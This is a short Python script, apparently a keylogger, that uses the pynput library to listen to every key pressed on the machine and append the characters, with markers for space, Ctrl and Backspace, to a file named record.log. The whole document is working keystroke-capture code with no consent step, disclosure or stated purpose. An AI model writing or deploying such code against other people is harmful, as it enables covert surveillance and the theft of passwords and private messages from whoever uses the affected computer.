from pynput.keyboard import Listener, Key

# This function is called whenever a key is pressed
def on_press(key):
    try:
        # Log the pressed key
        with open('record.log', 'a') as f:
            if key == Key.space:
                f.write(' ')
            elif key == Key.ctrl_l or key == Key.ctrl_r:
                f.write('[Ctrl]')
            elif key == Key.backspace:
                f.write('[Backspace]')
            else:
                f.write('{0}'.format(key.char))
            
    except AttributeError:
        # Some special keys like 'Ctrl', 'Shift', etc. don't have a char attribute
        pass

# Start listening for key presses
with Listener(on_press=on_press) as listener:
    listener.join()
    